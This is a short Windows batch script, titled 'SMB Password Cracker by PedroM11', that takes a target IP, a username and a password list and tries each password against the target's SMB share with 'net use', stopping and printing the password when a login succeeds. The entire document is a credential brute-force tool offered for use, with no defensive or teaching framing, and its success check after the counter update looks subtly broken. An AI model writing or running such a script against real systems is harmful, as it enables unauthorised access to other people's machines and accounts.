@echo off
title SMB Password Cracker by PedroM11
color 0A
setlocal enabledelayedexpansion

set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set count=1

for /f %%a in (%wordlist%) do (
    set pass=%%a
    call :attempt
)
echo Password Not Found
pause
exit

:success
echo Password Found: %pass%
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo ATTEMPT %count%: %pass%
set /a count=%count%+1
if %errorlevel% EQU 0 goto success
